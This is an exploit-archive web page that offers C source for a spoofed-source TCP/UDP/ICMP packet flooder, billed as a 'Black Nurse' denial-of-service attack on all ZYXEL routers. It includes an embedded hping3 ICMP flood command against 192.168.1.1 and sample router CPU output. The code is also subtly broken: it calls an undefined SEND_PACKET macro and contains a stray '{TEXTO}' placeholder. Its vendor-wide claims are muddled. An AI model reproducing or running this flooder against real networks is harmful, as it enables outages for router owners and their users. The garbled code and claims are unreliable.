	
<!DOCTYPE html>
<HTML lang="en">
<HEAD>
<META http-equiv="Content-Type" content="text/html; charset=utf-8">
<TITLE>ZYXEL Modems/Router ICMP Flood Black Nurse Attack - CXSecurity.com</TITLE>
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<META name="keywords" content="ZYXEL, Modems/Router, ICMP, Flood, Black, Nurse, Attack, exploit, vulnerability, bug, issue, advisories">
<META name="description" content="Hosein Askari has realised a new security note ZYXEL Modems/Router ICMP Flood Black Nurse Attack ">
<META name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<META name="mobile-web-app-capable" content="yes">
<link rel="manifest" href="/manifest.json?b">
<LINK rel="Icon" href="https://cert.cx/cxstatic/favicon.ico" type="image/x-icon">
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m-jq.js?T"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
<script type="text/javascript" src="https://cert.cx/cxstatic/js/m.js?V"></script>
<link href="https://cert.cx/cxstatic/css/b.css?G" rel="stylesheet" type='text/css'/>
</HEAD>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-39628967-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script><BODY ng-app="ui.bootstrap.demo">
<div class="navbar navbar-default navbar-fixed-top" id="frezz">
<div class="container"><div class="navbar-header"><a class="navbar-brand" href="https://cxsecurity.com/"><IMG SRC="https://cert.cx/cxstatic/images/12018/cxseci.png" width="150" height="20" ALT="Home Page"></a><button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button></div><div class="navbar-collapse collapse" id="navbar-main" ><ul class="nav navbar-nav">
          <li><a href="https://cxsecurity.com/">Home</a></li><li class="active">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Bugtraq<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bugs/">Only Bugs</a></li>
<li><a href="https://cxsecurity.com/tricks/">Only Tricks</a></li>
<li><a href="https://cxsecurity.com/exploit/">Only Exploits</a></li>
<li><a href="https://cxsecurity.com/dorks/">Only Dorks</a></li>
<li><a href="https://cxsecurity.com/cvelist/">Only CVE</a></li>
<li><a href="https://cxsecurity.com/cwelist/">Only CWE</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/bogus/">Fake Notes</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/best/1/">Ranking</a></li>

</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">CVEMAP<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/cvemap/">Full List</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">Show Vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">Show Products</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/allcwe/">CWE Dictionary</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">Check CVE Id </a></li>
<li><a href="https://cxsecurity.com/cwe/">Check CWE Id</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Search<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/search/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/cve/">CVEMAP</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/search/author/">By author</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cve/">CVE Id</a></li>
<li><a href="https://cxsecurity.com/cwe/">CWE Id</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cvevendors/">By vendors</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">By products</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">RSS<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="https://cxsecurity.com/wlb/rss/all/">Bugtraq</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/cverss/fullmap/">CVEMAP</a></li>
<li><a href="https://cxsecurity.com/cveproducts/">CVE Products</a></li>
    <li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/rss/vulnerabilities/">Bugs</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/exploit/">Exploits</a></li>
<li><a href="https://cxsecurity.com/wlb/rss/dorks/">Dorks</a></li>
</ul></li>
<li class="dropdown">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">More<span class="caret"></span></a>
<ul class="dropdown-menu" role="menu">
<li><a href="http://cifrex.org/">cIFrex</a></li>
<li class="divider"></li>
<li><a href="https://www.facebook.com/cxsec">Facebook</a></li>
<li><a href="https://twitter.com/cxsecurity">Twitter</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/donate/">Donate</a></li>
<li class="divider"></li>
<li><a href="https://cxsecurity.com/wlb/about/">About</a></li>
</ul></li>
</ul>
<ul class="nav navbar-nav navbar-right">
<li><a href="https://cxsecurity.com/wlb/add/">Submit</a></li>
</ul></div></div></div>
<div id="general"><TABLE width="100%"><TR><TD width="6%"></TD><TD id="boki"></TD><TD id='glowna'><CENTER>
<script src="https://www.google.com/recaptcha/api.js?onload=CaptchaCallback&render=explicit" async defer></script>
<script type="text/javascript">
        var CaptchaCallback = function() {
            var recap1 = grecaptcha.render('Recaptcha1', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'setComIt'});
            var recap2 = grecaptcha.render('Recaptcha2', {'sitekey' : '6LfbQCQTAAAAANKENerevt305dDl_nywcNEn91q6', 'theme' : 'dark', 'callback' : 'onSubmit'});
        };
    </script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular-sanitize/1.6.6/angular-sanitize.min.js"></script>
<script type="text/javascript" src="https://cxsecurity.com/js/show.js"></script>
<TABLE cellpadding="0" cellspacing="0" width="100%"><TR><TD>
<DIV ng-non-bindable><CENTER><h4><B>ZYXEL Modems/Router ICMP Flood Black Nurse Attack</B></h4>
<div class="panel panel-default""><div class="panel-body"><div class="container"><div class="row">
<div class="col-xs-12 col-md-3"><div class="well well-sm"><b>2017.02.18</b></div></div>
<div class="col-xs-12 col-md-6"><div class="well well-sm"><U>Credit:</U> <b> <A HREF="https://cxsecurity.com/author/Hosein+Askari/1/">Hosein Askari</a>  </b>
</div></div><div class="col-xs-5 col-md-3"><div class="well well-sm">
  <U>Risk:</U> <b>
<span class="label label-warning">Medium</span></b>
</div></div><div class="col-xs-3 col-md-3"><div class="well well-sm">
  <U>Local:</U> <b>No</b>
</div></div><div class="col-xs-4 col-md-3"><div class="well well-sm">
  <U>Remote:</U> <b><B>Yes</B></span></b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CVE:</U> <b>N/A</b>
</div></div><div class="col-xs-6 col-md-3"><div class="well well-sm">
  <U>CWE:</U> <b>N/A</b></div></div></div><P><TABLE width="70%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="9692700437"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR>
</TABLE><P></CENTER></div></div></div><P><DIV style="white-space: pre-wrap; word-break: break-all;" ng-non-bindable><div class="well well-sm premex">#####
#Exploit Title: Black Nurse Attack on ALL ZYXEL Modems/Router
#Exploit Author:  Hosein Askari  (FarazPajohan)
#Vendor HomePage: http://www.zyxel.com/index.shtml
#Version : All 
#Tested on: Parrot OS
#Date: 17-2-2017
#Category: Network Appliance
#Vulnerable Part: Kernel
#Author Mail :hosein.askari@aol.com
#Description:
#The ZYXEL Modems&#039;s kernel is disrupted by vulnerability on ICMP Type, in which the cpu usage will be 100% until the local exploit launches on the router.
****************************
#Exploit Command :
# ~~~#exploit.out -I -h &lt;victim_ip&gt; -p [80,80]  
#
#Exploit Code :

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#ifdef F_PASS
#include &lt;sys/stat.h&gt;
#endif
#include &lt;netinet/in_systm.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#ifndef __USE_BSD
# define __USE_BSD
#endif
#ifndef __FAVOR_BSD
# define __FAVOR_BSD
#endif
#include &lt;netinet/in.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;netinet/udp.h&gt;
#include &lt;netinet/ip_icmp.h&gt;
#include &lt;arpa/inet.h&gt;
#ifdef LINUX
# define FIX(x) htons(x)
#else
# define FIX(x) (x)
#endif
#define TCP_ACK 1
#define TCP_FIN 2
#define TCP_SYN 4
#define TCP_RST 8
#define UDP_CFF 16
#define ICMP_ECHO_G 32
#define TCP_NOF 64
#define TCP_URG 128
#define TH_NOF 0x0
#define TCP_ATTACK() (a_flags &amp; TCP_ACK ||\
a_flags &amp; TCP_FIN ||\
a_flags &amp; TCP_SYN ||\
a_flags &amp; TCP_RST ||\
a_flags &amp; TCP_NOF ||\
a_flags &amp; TCP_URG )
#define UDP_ATTACK() (a_flags &amp; UDP_CFF)
#define ICMP_ATTACK() (a_flags &amp; ICMP_ECHO_G)
#define CHOOSE_DST_PORT() dst_sp == 0 ?\
random () :\
htons(dst_sp + (random() % (dst_ep -dst_sp +1)));
#define CHOOSE_SRC_PORT() src_sp == 0 ?\
random () :\
htons(src_sp + (random() % (src_ep -src_sp +1)));
#define KET() if (sendto(rawsock,\
&amp;packet,\
(sizeof packet),\
0,\
(struct sockaddr *)&amp;target,\
sizeof target) &lt; 0) {\
perror(&quot;sendto&quot;);\
exit(-1);\
}
#define BANNER_CKSUM 54018
u_long lookup(const char *host);
unsigned short in_cksum(unsigned short *addr, int len);
static void inject_iphdr(struct ip *ip, u_char p, u_char len);
char *class2ip(const char *class);
static void send_tcp(u_char th_flags);
static void send_udp(u_char garbage);
static void send_icmp(u_char garbage);
char *get_plain(const char *crypt_file, const char *xor_data_key);
static void usage(const char *argv0);
u_long dstaddr;
u_short dst_sp, dst_ep, src_sp, src_ep;
char *src_class, *dst_class;
int a_flags, rawsock;
struct sockaddr_in target;
const char *banner = &quot;Written By C0NSTANTINE&quot;;
struct pseudo_hdr {
u_long saddr, daddr;
u_char mbz, ptcl;
u_short tcpl;
};
struct cksum {
struct pseudo_hdr pseudo;
struct tcphdr tcp;
};
struct {
int gv;
int kv;
void (*f)(u_char);
} a_list[] = {
{ TCP_ACK, TH_ACK, send_tcp },
{ TCP_FIN, TH_FIN, send_tcp },
{ TCP_SYN, TH_SYN, send_tcp },
{ TCP_RST, TH_RST, send_tcp },
{ TCP_NOF, TH_NOF, send_tcp },
{ TCP_URG, TH_URG, send_tcp },
{ UDP_CFF, 0, send_udp },
{ ICMP_ECHO_G, ICMP_ECHO, send_icmp },
{ 0, 0, (void *)NULL },
};
int
main(int argc, char *argv[])
{
int n, i, on = 1;
int b_link;
#ifdef F_PASS
struct stat sb;
#endif
unsigned int until;
a_flags = dstaddr = i = 0;
dst_sp = dst_ep = src_sp = src_ep = 0;
until = b_link = -1;
src_class = dst_class = NULL;
while ( (n = getopt(argc, argv, &quot;T:UINs:h:d:p:q:l:t:&quot;)) != -1) {
char *p;
switch (n) {
case &#039;T&#039;:
switch (atoi(optarg)) {
case 0: a_flags |= TCP_ACK; break;
case 1: a_flags |= TCP_FIN; break;
case 2: a_flags |= TCP_RST; break;
case 3: a_flags |= TCP_SYN; break;

case 4: a_flags |= TCP_URG; break;


}
break;
case &#039;U&#039;:
a_flags |= UDP_CFF;
break;
case &#039;I&#039;:
a_flags |= ICMP_ECHO_G;
break;
case &#039;N&#039;:
a_flags |= TCP_NOF;
break;
case &#039;s&#039;:
src_class = optarg;
break;
case &#039;h&#039;:
dstaddr = lookup(optarg);
break;
case &#039;d&#039;:
dst_class = optarg;
i = 1;
break;
case &#039;p&#039;:
if ( (p = (char *) strchr(optarg, &#039;,&#039;)) == NULL)
usage(argv[0]);
dst_sp = atoi(optarg);
dst_ep = atoi(p +1);
break;
case &#039;q&#039;:
if ( (p = (char *) strchr(optarg, &#039;,&#039;)) == NULL)
usage(argv[0]);
src_sp = atoi(optarg);
src_ep = atoi(p +1);
break;
case &#039;l&#039;:
b_link = atoi(optarg);
if (b_link &lt;= 0 || b_link &gt; 100)
usage(argv[0]);
break;
case &#039;t&#039;:
until = time(0) +atoi(optarg);
break;
default:
usage(argv[0]);
break;
}
}
if ( (!dstaddr &amp;&amp; !i) ||
(dstaddr &amp;&amp; i) ||
(!TCP_ATTACK() &amp;&amp; !UDP_ATTACK() &amp;&amp; !ICMP_ATTACK()) ||
(src_sp != 0 &amp;&amp; src_sp &gt; src_ep) ||
(dst_sp != 0 &amp;&amp; dst_sp &gt; dst_ep))
usage(argv[0]);
srandom(time(NULL) ^ getpid());
if ( (rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) {
perror(&quot;socket&quot;);
exit(-1);
}
if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL,
(char *)&amp;on, sizeof(on)) &lt; 0) {
perror(&quot;setsockopt&quot;);
exit(-1);
}
target.sin_family = AF_INET;
for (n = 0; ; ) {
if (b_link != -1 &amp;&amp; random() % 100 +1 &gt; b_link) {
if (random() % 200 +1 &gt; 199)
usleep(1);
continue;
}
for (i = 0; a_list[i].f != NULL; ++i) {
if (a_list[i].gv &amp; a_flags)
a_list[i].f(a_list[i].kv);
}
if (n++ == 100) {
if (until != -1 &amp;&amp; time(0) &gt;= until) break;
n = 0;
}
}
exit(0);
}
u_long
lookup(const char *host)
{
struct hostent *hp;

if ( (hp = gethostbyname(host)) == NULL) {
perror(&quot;gethostbyname&quot;);
exit(-1);
}
return *(u_long *)hp-&gt;h_addr;
}
#define RANDOM() (int) random() % 255 +1
char *
class2ip(const char *class)
{
static char ip[16];
int i, j;

for (i = 0, j = 0; class[i] != &#039;{TEXTO}&#039;; ++i)
if (class[i] == &#039;.&#039;)
++j;
switch (j) {
case 0:
sprintf(ip, &quot;%s.%d.%d.%d&quot;, class, RANDOM(), RANDOM(), RANDOM());
break;
case 1:
sprintf(ip, &quot;%s.%d.%d&quot;, class, RANDOM(), RANDOM());
break;
case 2:
sprintf(ip, &quot;%s.%d&quot;, class, RANDOM());
break;
default: strncpy(ip, class, 16);
break;
}
return ip;
}
unsigned short
in_cksum(unsigned short *addr, int len)
{
int nleft = len;
int sum = 0;
unsigned short *w = addr;
unsigned short answer = 0;
while (nleft &gt; 1) {
sum += *w++;
nleft -= 2;
}
if (nleft == 1) {
*(unsigned char *) (&amp;answer) = *(unsigned char *)w;
sum += answer;
}
sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
sum += (sum &gt;&gt; 16);
answer = ~sum;
return answer;
}
static void
inject_iphdr(struct ip *ip, u_char p, u_char len)
{
ip-&gt;ip_hl = 5;
ip-&gt;ip_v = 4;
ip-&gt;ip_p = p;
ip-&gt;ip_tos = 0x08; /* 0x08 */
ip-&gt;ip_id = random();
ip-&gt;ip_len = len;
ip-&gt;ip_off = 0;
ip-&gt;ip_ttl = 255;
ip-&gt;ip_dst.s_addr = dst_class != NULL ?
inet_addr(class2ip(dst_class)) :
dstaddr;
ip-&gt;ip_src.s_addr = src_class != NULL ?
inet_addr(class2ip(src_class)) :
random();
target.sin_addr.s_addr = ip-&gt;ip_dst.s_addr;
}
static void
send_tcp(u_char th_flags)
{
struct cksum cksum;
struct packet {
struct ip ip;
struct tcphdr tcp;
} packet;
memset(&amp;packet, 0, sizeof packet);
inject_iphdr(&amp;packet.ip, IPPROTO_TCP, FIX(sizeof packet));
packet.ip.ip_sum = in_cksum((void *)&amp;packet.ip, 20);
cksum.pseudo.daddr = dstaddr;
cksum.pseudo.mbz = 0;
cksum.pseudo.ptcl = IPPROTO_TCP;
cksum.pseudo.tcpl = htons(sizeof(struct tcphdr));
cksum.pseudo.saddr = packet.ip.ip_src.s_addr;
packet.tcp.th_flags = random();
packet.tcp.th_win = random();
packet.tcp.th_seq = random();
packet.tcp.th_ack = random();
packet.tcp.th_off = 5;
packet.tcp.th_urp = 0;
packet.tcp.th_sport = CHOOSE_SRC_PORT();
packet.tcp.th_dport = CHOOSE_DST_PORT();
cksum.tcp = packet.tcp;
packet.tcp.th_sum = in_cksum((void *)&amp;cksum, sizeof(cksum));
SEND_PACKET();
}
static void
send_udp(u_char garbage)
{
struct packet {
struct ip ip;
struct udphdr udp;
} packet;
memset(&amp;packet, 0, sizeof packet);
inject_iphdr(&amp;packet.ip, IPPROTO_UDP, FIX(sizeof packet));
packet.ip.ip_sum = in_cksum((void *)&amp;packet.ip, 20);
packet.udp.uh_sport = CHOOSE_SRC_PORT();
packet.udp.uh_dport = CHOOSE_DST_PORT();
packet.udp.uh_ulen = htons(sizeof packet.udp);
packet.udp.uh_sum = 0;
SEND_PACKET();
}
static void
send_icmp(u_char gargabe)
{
struct packet {
struct ip ip;
struct icmp icmp;
} packet;
memset(&amp;packet, 0, sizeof packet);
inject_iphdr(&amp;packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
packet.ip.ip_sum = in_cksum((void *)&amp;packet.ip, 20);
packet.icmp.icmp_type = ICMP_ECHO;
packet.icmp.icmp_code = 0;
packet.icmp.icmp_cksum = htons( ~(ICMP_ECHO &lt;&lt; 8));
for(int pp=0;pp&lt;=1000;pp++)
{SEND_PACKET();
system(&quot;sudo hping3 --icmp -C 3 -K 3  --flood 192.168.1.1&quot;);
pp++;
}
}
static void
usage(const char *argv0)
{
printf(&quot;%s \n&quot;, banner);
printf(&quot; -U UDP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -I ICMP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -N Bogus attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -T TCP attack \e[1;37m[\e[0m0:ACK, 1:FIN, 2:RST, 3:SYN, 4:URG\e[1;37m]\e[0m\n&quot;);
printf(&quot; -h destination host/ip \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -d destination class \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -s source class/ip \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -p destination port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -q source port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -l pps limiter \e[1;37m(\e[0m\e[0;31mno limit\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot; -t timeout \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n&quot;);
printf(&quot;\e[1musage\e[0m: %s [-T0 -T1 -T2 -T3 -T4 -U -I -h -p -t]\n&quot;, argv0);
exit(-1);
}

##################

#Description :
#The Sample Output of &quot;CPU Usage&quot; is shown below :

ras&gt; sys cpu display
CPU usage status:
  baseline 2106258 ticks
 sec  ticks  util    sec  ticks  util    sec  ticks  util    sec  ticks  util
  0   38946  98.15    1   41192  98.04    2   31775  98.49    3   28809  98.63
  4   34793  98.34    5   29538  98.59    6   27583  98.69    7   24396  98.84
  8   37998  98.19    9   37480  98.22   10   45516  97.83   11   30303  98.56
 12   65621  96.88   13   43413  97.93   14   23665  98.87   15   22725  98.92
 16   37541  98.21   17   23472  98.88   18   21547  98.97   19   29162  98.61
 20   44610  97.88   21   46361  97.79   22   29142  98.61   23   44881  97.86
 24   27780  98.68   25   41068  98.05   26   27908  98.67   27  443183  78.95
 28  855646  59.37   29  880562  58.19   30  896890  57.41   31  898806  57.32
 32  716284  65.99   33  356495  83.07   34   81422  96.13   35  101699  95.17
 36   94883  95.49   37   94579  95.50   38   65748  96.87   39   69851  96.68
 40   46499  97.79   41   42021  98.00   42   66529  96.84   43   66446  96.84
 44   38797  98.15   45   62718  97.02   46    3370  99.84   47   30205  98.56
 48   43499  97.93   49   37927  98.19   50   33788  98.39   51   40783  98.06
 52   34171  98.37   53   45389  97.84   54   41723  98.01   55   33155  98.42
 56   39552  98.12   57   36637  98.26   58   43808  97.92   59   24510  98.83
 60   29158  98.61   61   35887  98.29   62   34649  98.35
</DIV></P><P class="txt" id="refer"></P></DIV><div class="panel panel-default"">
 <div class="panel-body"><div class="well well-sm"><b><h5><U>References:</U></h5></b><P class="txt"><DIV ng-non-bindable> <DIV STYLE="text-decoration:none;color:#f4f4f4;target-new: tab;" onclick="window.open('http://www.zyxel.com/index.shtml', '_blank')" onmouseover="this.style.textDecoration ='underline';this.style.cursor='pointer';" onmouseout="this.style.textDecoration='none';">http://www.zyxel.com/index.shtml</DIV></DIV><BR></div><CENTER>
<TABLE width="75%"><TR><TD><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-5074670963595353"
     data-ad-slot="6599633238"
     data-full-width-responsive="true"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></TD></TR></TABLE><BR>
<div class="container"><div class="row">
<div class="col-xs-12 col-md-6"><div class="well well-sm">
<CENTER><A HREF="https://cxsecurity.com/ascii/WLB-2017020177"><FONT SIZE="4"><b>See this note in RAW Version</b></FONT></A></CENTER></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<a href="https://twitter.com/share" class="twitter-share-button" data-count="none">Tweet</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script></div></div>
<div class="col-xs-6 col-md-3"><div class="well well-sm">
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/pl_PL/sdk.js#xfbml=1&version=v2.3";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="fb-like" data-href="https://cxsecurity.com/issue/WLB-2017020177" data-width="50" data-layout="button" data-action="like" data-show-faces="false" data-share="false"></div></div></div>
<div class="col-xs-12 col-md-12"><div class="well well-sm">
<div class="container">
<div class="group-form inline">
<div class="col-sm-12 col-md-6" valign="middle">
Vote for this issue:
<input type="hidden" id="numberWlb" value="2017020177">
<button type="button" id="dodatnie" class="btn btn-success glyphicon glyphicon-thumbs-up" data-loading-text=" ... "  data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" value="1">         1</button>
<button type="button" id="ujemne" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" value="0">       0</button>
</div>
<div class="col-sm-11 col-md-5" valign="middle" id="barr">
<div class="progress progress-striped" style="margin-top: 11px;" >
<div class="progress-bar progress-bar-success active" id="dodatnieBar" data-toggle="collapse" data-target="#voteCaptcha" onClick="setPositive()" onLoad="alreV()" style="width: 100%"><div id="valGreBar">100%</div></div>
<div class="progress-bar progress-bar-danger active" id="ujemneBar" class="btn btn-danger glyphicon glyphicon-thumbs-down" data-loading-text=" ... " data-toggle="collapse" data-target="#voteCaptcha"  onClick="setNegative()" style="width: 0%"><div id="valRedBar">0%</div></div>
</div></div></div></div>
<div id="voteCaptcha" class="collapse">
<BR><div class="g-recaptcha" id="Recaptcha2"></div>
</div>
<div id="thanksVote">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you vote!</strong></h4></div>
</div>
<div id="thanksComm">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you comment!</strong><br>Your message is in quarantine 48 hours.</h4></div>
</div></CENTER></div></div></div>
<div id="cWlb">
<div class="well well-sm"><input name="wlb" value="2017020177" type="hidden">
<fieldset>
<legend>Comment it here.</legend>
<div class="form-group form-horizontal">
<label for="inputNick" class="col-lg-1 control-label">Nick (*)</label>
<div class="col-lg-11"><input name="n" class="form-control" id="inputNick" placeholder="Nick" style="background-color: black;" onchange="document.getElementById('commCaptcha').style.display='block';"></div></div>
<div class="form-group form-horizontal">
<label for="inputEmail" class="col-lg-1 control-label">Email (*)</label>
<div class="col-lg-11"><input name="e" class="form-control" id="inputEmail" placeholder="Email" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="inputYoutube" class="col-lg-1 control-label">Video </label>
<div class="col-lg-11"><input name="v" class="form-control" id="inputVideo" placeholder="Link to Youtube" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="textArea" class="col-lg-1 control-label">Text (*)</label>
<div class="col-lg-11">
<textarea name="c" class="form-control" rows="6" id="inputComment" style="background-color: black;"></textarea></div></div>
<div class="form-group form-horizontal">
<div class="col-lg-12" id="commCaptcha" class="collapse"><BR>
<CENTER><div id="Recaptcha1"></div><BR>
<small>(*) - <cite title="requi">required fields. </cite></small> &nbsp;
<button type="reset" class="btn btn-default" style="background-color: transparent; margin-left: 0px; margin-right: 0px;">Cancel</button>
<button type="submit" id="wysl"  style="background-color: black; margin-left: 0px; margin-right: 0px;" class="btn btn-default" onclick="comIt()">Submit</button>
</CENTER>
</div></div></fieldset></div></div>
<div ng-app="ui.bootstrap.demo" ng-controller="myCtrl">
<div ng-repeat="x in comments">
<div class="well well-sm">
<table width="100%"><TR><TD width="7%"><div ng-bind-html="x.video"></div></TD><TD style="max-width: 100%;overflow: visible;"><div align="left" class="breakcx" id="breakcx"><U><b>{{ x.nick }}</b></U> <img width="20" height="14" ng-src="https://cxsecurity.com/images/flags/{{ x.country }}.png"> | <U>Date:</U> {{ x.ux  * 1000 | date:'yyyy-MM-dd' }} <I>{{ x.ux  * 1000 | date:'HH:mm' }}</I> CET+1<HR style="padding: 0px; margin: 5px;"><DIV style="white-space: pre-wrap;">{{ x.comment }}</DIV>
</div>
</TD></TR></table>
</div>
</div><button type="button" id="shomor" class="btn btn-link btn-block" ng-click="getNextCom()">Show all comments</button></div></div></div></CENTER>
</TD></TR></TABLE>
<script>
$("#thanksComm").hide(); $("#cWLb").hide(); $("#thanksVote").hide(); $("#commCaptcha").hide();
if (localStorage.vote2017020177==1) {             
document.getElementById('voteCaptcha').style.display = 'none'; document.getElementById("dodatnie").disabled = true; document.getElementById("ujemne").disabled = true;
 }</script><HR>
Copyright <b>2021</b>, cxsecurity.com<P>&nbsp;
    </TD>
    <TD id='boki'></TD>
    <TD width="6%"></TD>
	</TR>
</TABLE>
<a href="#" class="back-to-top">Back to Top</a>
    </DIV>
    </DIV>
</BODY>
</HTML>
